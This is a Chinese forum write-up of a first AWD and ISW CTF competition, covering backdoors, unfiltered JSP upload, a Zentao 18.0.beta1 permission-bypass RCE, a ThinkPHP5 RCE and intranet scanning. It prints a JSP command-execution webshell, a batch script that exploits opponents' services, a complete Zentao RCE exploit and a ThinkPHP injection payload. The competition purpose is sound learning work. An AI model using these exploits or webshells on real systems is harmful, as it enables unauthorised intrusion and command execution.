# 记第一次AWD与ISW之旅

> **来源**: https://forum.butian.net/share/2950  
> **文章ID**: 2950

---

长城杯2024半决赛-WP
=============

记录一下第一次攻防对抗AWD和综合渗透ISW的线下比赛的WP，大佬轻喷。

攻防对抗AWD
=======

题目一 | Tomcat
------------

### processBuilder后门

D盾扫一下，forget.jsp存在一个processBuilder后门，可以直接回显，直接正常命令打就行了；

![image-20240423011910561](images/attach-0940646f77cd9420c66c9bb3024ae07bafc9e6a8.png)

![img](images/attach-4fc512b725d802fe4d2261af63bdd1aa3c209d67.jpeg)

修复：也很简单，直接注释processBuilde的关键语句或者那一整段注释掉；

### 文件上传

发现被打了好多，开始排查，发现userImg目录下面被上传了恶意shell，老师账号密码被修改登录不上去急急急，学生后面也发现被添加了一些用户；

没有别的办法了只能去mysql数据库直接改密码了，先要登录上mysql，所以先去给的databases.sql文件看看有没有账号密码，确实有：

![img](images/attach-ad7d21454a4034e6dafd6677c0179425c2e79494.jpeg)

直接登录修改test1数据库的teacher表的账号密码。

![img](images/attach-014b9e66509a73a2c6320d6479b5b769f07f6542.jpeg)

然后发现，有一个文件上传接口，没有任何过滤；

![img](images/attach-f02bbeff46006a86d98adbe825b58793338eeb50.jpeg)

排查到自己的userImg确实被上传了不少恶意jsp-shell；

![img](images/attach-a24f9f69686d8e79c02df32aa2f82edca65ad265.jpeg)

排查到学生和老师的头像上传位置不校验文件，直接上传恶意shell，再次测试发现，不用登录也可以上传?；

![img](images/attach-ba6e94293946e7a5d3fa3acec9b4a9a293c832ae.jpeg)

那就写个脚本，批量打打；（中间找回显?找了好久，自己还不会写内存?，背大锅?）

修复：由于没怎么审计过tomcat-jsp架构的web系统，短时间内没定位到具体的有问题的jsp文件，因此直接给userImg加了个400权限，不能上传文件即可。（还是被打了好多，不知道从哪打的。我想可能是已经被打了不少内存?）

![img](images/attach-5cf382df047b1b2e7cf888d2d40a846b7e7c4270.jpeg)

```php
回显?：
<%  java.io.InputStream in \= Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a \= \-1; byte\[\] b \= new byte\[2048\]; out.print(""); while((a\=in.read(b))!=-1){ out.println(new String(b)); } out.print(""); %>
```

题目二 | cms
---------

D盾可以扫出后门和一些可以函数，注释掉即可。

![img](images/attach-5ed8af00c6926bc0909012a595dde7974c5c025f.png)

然后短时间没看出怎么打，被打了好多分?，摆了。

题目三 | DocToolkit
----------------

### processBuilder后门

同样是后门。直接打就行

修复：注释即可，由于是jar包，需要先编译出class文件再覆盖添加进去；当然直接删掉也可以。

![img](images/attach-585c0b364c155dbf8e83d57dce2604a9d235339c.png)

总exp（一键攻击&批量保存flag到本地）
--------------------------

> 需提前将ip和port用:连接起来，格式是一行一个，例如：
> 
> 127.0.0.1:1234
> 
> 127.0.0.1:1235

```php
import requests,time,re

​

\# 提交flag的url和token等

submit\_url \= ""

submit\_token \= ""

submit\_cookie \= ""

headers \= {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',

    "Cookie":submit\_cookie

}

timout \= 1

​

def submit\_flag(flag):

    data \= {

        'flag':flag,

        'token':submit\_token

    }

    try:

        \# r = requests.post(url,headers=headers,data = json.dumps(data))

        res \= requests.post(submit\_url, data\=data,headers\=headers,timeout\=timout)

        print(res.text)

    except Exception as e:

        print(f"{flag} submit failed!")

​

​

def grep\_flag(id,text):

    \# 提取全flag

    matches \= re.findall(r'flag{.\*}', text, re.DOTALL | re.IGNORECASE)

    \# 提取花括号里面的

    \# matches = re.findall(r'flag{(.\*?)}',text,re.DOTALL | re.IGNORECASE)

    for m in matches:

        print(m)

        with open(f"file\_share/flag-{id}.txt","a",encoding\="utf-8") as file:

            file.writelines(m+"\\n")

        file.close()

    return matches\[0\]

​

​

def exp1(ip):

    url \= "http://" + ip +"/forget.jsp"

    params \= {

        "cmd1":"cat /flag"

    }

    data \= {

        "exp":"payload"

    }

    try:

        res \= requests.get(url \= url,params\=params,timeout\=timout)

        \# res = requests.post(url = url, data=data,timeout=timout)

        flag \= grep\_flag(1,res.text)

        \# submit\_flag(flag)

    except Exception as e:

        print(f"{ip} attack failed!")

​

def exp11(ip):

    url1 \= "http://" + ip +"/upload\_teacherImg"

    url2 \= "http://" + ip +"/upload\_studentImg"

    flag\_url \= "http://"+ip+"/userImg/123.jsp"

    params \= {

        "i":"cat /flag"

    }

    data \= {

        "id":"admin"

    }

    files \= {"img": ("123.jsp",open("shell.jsp").read())}

    try:

        \# res = requests.get(url = url,params=params,timeout=timout)

        res \= requests.post(url \= url1, data\=data,files\=files,timeout\=timout)

        print(res.text)

        res2 \= requests.get(url \= flag\_url,params\=params,timeout\=timout)

        flag \= grep\_flag(1,res2.text)

        \# submit\_flag(flag)

    except Exception as e:

        print(f"{ip} attack failed!")

​

    try:

        \# res = requests.get(url = url,params=params,timeout=timout)

        res \= requests.post(url \= url2, data\=data,files\=files,timeout\=timout)

        \# print(res.text)

        res2 \= requests.get(url \= flag\_url,params\=params,timeout\=timout)

        flag \= grep\_flag(1,res2.text)

        \# submit\_flag(flag)

    except Exception as e:

        print(f"{ip} attack failed!")

​

​

def exp3(ip):

    url \= "http://" + ip +"/test/backd0or"

    params \= {

        "cmd1":"cat /flag"

    }

    data \= {

        "cmd":"cat /flag"

    }

    try:

        \# res = requests.get(url = url,params=params,timeout=timout)

        res \= requests.post(url \= url, data\=data,timeout\=timout)

        flag \= grep\_flag(3,res.text)

        \# submit\_flag(flag)

    except Exception as e:

        print(f"{ip} attack failed!")

​

def get\_ip1():

    ips \=\[\]

    ports \= \[\]

    with open("tomcat.txt","r") as file:

        ips \= file.readlines()

    return ips

​

def get\_ip3():

    with open("3.txt","r") as file:

        ips \= file.readlines()

    return ips

​

if \_\_name\_\_ \== '\_\_main\_\_' :

    \# 这个可以看请况写个循环，遍历出所有ip

​

    ips1\= get\_ip1()

    print(ips1)

    ips3 \= get\_ip3()

    \# port = 80

    for ip in ips1:

        ip.replace("\\n","")

        print(ip)

        exp1(ip)

        exp11(ip)

​

    for ip in ips3:

        ip.replace("\\n", "")

        exp3(ip)

    #

    \# print("this turn finish!")
```

ISW
===

单节点一 | 禅道 | **8.130.84.111**
----------------------------

**禅道18.0.beta1版本的权限绕过**的RCE可参考：<https://www.freebuf.com/vuls/357138.html>

### flag01-后台登录

先拿的flag02，RCE后利用root/root弱口令登录mysql，然后使用sql语句进行查询数据库，很轻易就查询到了禅道的admin后台密码；

登录后发现在后台的一个功能模块藏着?，使用cyberchef的魔法棒就能解出来，但是最后没交上，差几秒?

![img](images/attach-9228875db24ee00dba8e96a78da5d52da262d698.png)

cmd5查询得到Passw0rd弱口令密码，这里应该是要我们猜到这个弱口令，看来我是曲线救国了。

![img](images/attach-f34357d806984ffcc7493d2ccb219a8a1c01b38c.png)

在一个功能模块下面，有一串加密字符串：

![img](images/attach-fa6ad30017a30845e56567c0aa5144d84f71e38c.png)

扔到cyberchef自动检测，点击魔方棒，自动进行解密，是多种base加密的组合：

![img](images/attach-b26e47163e474b13627c3458d5e1f2ca700459ff.png)

### flag02-禅道18.0.beta1-RCE

参考上面的禅道18.0.beta1-RCE文章进行RCE后，可以在/var/www/html目录下面翻到flag02；

![img](images/attach-397248957fe960ebcbe608da74444520f096d8c6.png)

禅道18.0.beta1-RCE总的exp如下，我来解释一下大致的原理；

- 首先是通过/index.php?m=misc&f=captcha&sessionVar=user路由进行了权限的绕过；
- 然后是根据路由/index.php?m=block&f=printBlock&id=1&module=my判断是否绕过成功；
- 之后根据路由/index.php?m=repo&f=create&objectID=0&tid=rmqcl0ss进行POST请求数据创建代码库；
- 最后是在/index.php?m=repo&f=edit&repoID=8&objectID=0&tid=rmqcl0ss路由进行POST恶意数据，具体是在client参数里，就可以远程执行命令了。

```php
import requests

​

proxies \= {

    # "http": "127.0.0.1:8080",

    # "https": "127.0.0.1:8080",

}

​

​

def check(url):

    # url1 \= url + '/misc-captcha-user.html'

    url1 \= url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参

    url2 \= url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接

    # url3 \= url + '/repo-create.html'

    url3 \= url + '/index.php?m=repo&f=create&objectID=0&tid=rmqcl0ss'

    # url4 \= url + '/repo-edit-10000-10000.html'

    url4 \= url + '/index.php?m=repo&f=edit&repoID=8&objectID=0&tid=rmqcl0ss'

    headers \= {

        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",

        "Accept-Language": "zh-CN,zh;q=0.9",

        # "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",

        "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",

    }

​

    headers2 \= {

        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",

        "Accept-Language": "zh-CN,zh;q=0.9",

        "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default",

        "Content-Type": "application/x-www-form-urlencoded",

        "X-Requested-With": "XMLHttpRequest",

        "Referer": url + "/repo-edit-1-0.html"

    }

​

    # data1 \= 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid='

    data1 \= 'product%5B%5D=1&SCM=Gitlab&serviceProject=wangnima&name=wangnima2333&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=63e4a18218a68'

    # data2 \= r'SCM=Subversion&client=ls;'

    data2 \= r'product%5B%5D=1&SCM=Subversion&serviceHost=&name=wangnima2333&path=http%3A%2F%2F123.4.5.6&encoding=utf-8&client=pwd;&account=&password=&encrypt=base64&desc=&uid=63e4a26b5fd65'

    s \= requests.session()

    try:

        req1 \= s.get(url1, timeout\=5, verify\=False, headers\=headers)

        req3 \= s.post(url3, data\=data1,  timeout\=5, verify\=False, headers\=headers2)

        print(req3.text)

        req4 \= s.post(url4, data\=data2,  timeout\=5, verify\=False, headers\=headers2)

        print(req4.text)

        # if 'uid=' in req4.text:

        #

        #     print(url, "")

        #     return True

    except Exception as e:

        print(e)

    # return False

​

​

if \_\_name\_\_ \== '\_\_main\_\_':

    print(check("http://8.130.84.111"))
```

单节点二 | cms | **8.130.182.209**
------------------------------

### flag01-压缩包弱口令

扫到了backup.zip

![img](images/attach-db0f5a2b18cd076981bc0d844aed22d1a8f7827e.png)

解压有流量包，发现有flag.zip，导出全部的http流量文件：

![img](images/attach-29b4bec6dd9c46d5754a01aa5366072117f679bf.png)

压缩包有密码，弱口令123456打开即可：

![img](images/attach-d8ffe8b94c3d62802a18545482e24b32b8c17be6.png)

### flag02-搜索能力

![img](images/attach-7c91f167692d3a85c89a72018393623c9d354dd7.png)

### JS逆向-登录

比赛时没有进行js的断点调试，赛后只能静态嗯看了。

访问IP发现是一个登录窗口，所以要尝试进入后台；

![img](images/attach-1ddcf003ae5b7ec315affe036e0b6272e6857a21.png)

在流量包发现有尝试登录的流量，发现了username和password字样，但是password被加密了，直接复制进行登录是不行的，估计是加入了动态的参数如时间戳进行加密，要逆向了：

![img](images/attach-5df384f75d44c895697fdb122a7cf6b4fbb5784f.png)

![img](images/attach-473ef4a127bdf6e2671864bcf40a895981090be6.png)

可以在dump出流量的app.js看到有encrypt函数，是进行了aes然后base64的加密，iv是传入进来的s，key是传入进来的t，e是未加密的原文，我们追踪一下，是u函数调用的，往上看看；

![img](images/attach-67cfff2e61b40608be99c32f128d0c3ee679e7a7.png)

发现了，是在doLogin函数对传入的password进行了字符串拼接，然后加密，看看r，a，n分别是什么：

![img](images/attach-5c3c3b28c0abe66eebc6245ba252ca883a6a30c5.png)

可以看到r是一个时间相关的字符串拼接，动态的；a是l的值，n是c的值，应该分别是key和iv

![img](images/attach-4d76ea8a7913d9dba0bff3067053eae724d9ee5f.png)

![img](images/attach-bde78cedeb51b002ba421e2d019b997b053853d5.png)

现在知道密文和key和iv，因此解密起来就十分容易了，test账号的密码是nsfo@#$23d^^fsf%h(()jcus：

![img](images/attach-2c5b98caf55251a1d32196b51884c7c0a6240bf1.png)

多节点三 | thinkphp+内网 | **8.130.183.18**
-------------------------------------

记：当时打红温了，脑子比较混乱，隧道搭建的思路也没有理清，导致没去打内网。后面尝试外网靶机的各种提权，没成功?

### flag01-thinkphp5的RCE

入口节点直接扫就是一个thinkphp5023-method-rce-poc1，具体的攻击方式如下，路由是/index.php?s=captcha，post数据是method=construct&filter\[\]=system&method=GET&get\[\]=ls，其中get\[\]那里是传入的参数，filter\[\]那里是函数名：

![img](images/attach-9dea2c18831d2a34a68428da5c5ffb15dd95751a.png)

![img](images/attach-d35b88083017348e1ae23105150941c939e32f72.png)

后面内网网段的扫描，由于红温隧道没搭成，所以没去打

```php
(icmp) Target 172.28.23.26    is alive

(icmp) Target 172.28.23.33    is alive

(icmp) Target 172.28.23.17    is alive

\[\*\] Icmp alive hosts len is: 3

172.28.23.26:21 open

172.28.23.33:22 open

172.28.23.26:22 open

172.28.23.17:22 open

172.28.23.26:80 open

172.28.23.17:80 open

172.28.23.17:1080 open

172.28.23.33:8080 open

172.28.23.17:8080 open

172.28.23.33:59696 open

\[\*\] alive ports len is: 10

start vulscan

\[\*\] WebTitle http://172.28.23.26       code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413

\[\*\] WebTitle http://172.28.23.33:8080  code:302 len:0      title:None 跳转url: http://172.28.23.33:8080/login;jsessionid=CECC02D1ECC5B8BAFA59827758912DB3

\[+\] ftp 172.28.23.26:21:anonymous 

   \[\->\]OASystem.zip

\[\*\] WebTitle http://172.28.23.33:8080/login;jsessionid=CECC02D1ECC5B8BAFA59827758912DB3 code:200 len:3860   title:智联科技 ERP 后台登陆

\[\*\] WebTitle http://172.28.23.17       code:200 len:10887  title:""

\[\*\] WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form

\[+\] PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1

\[+\] PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file 

\[+\] PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2
```

可以看到26-ip的21端口有一个ftp匿名登录，有80端口的新翔OA管理系统的源码，应该是要我们进行审计出漏洞，然后进行利用。
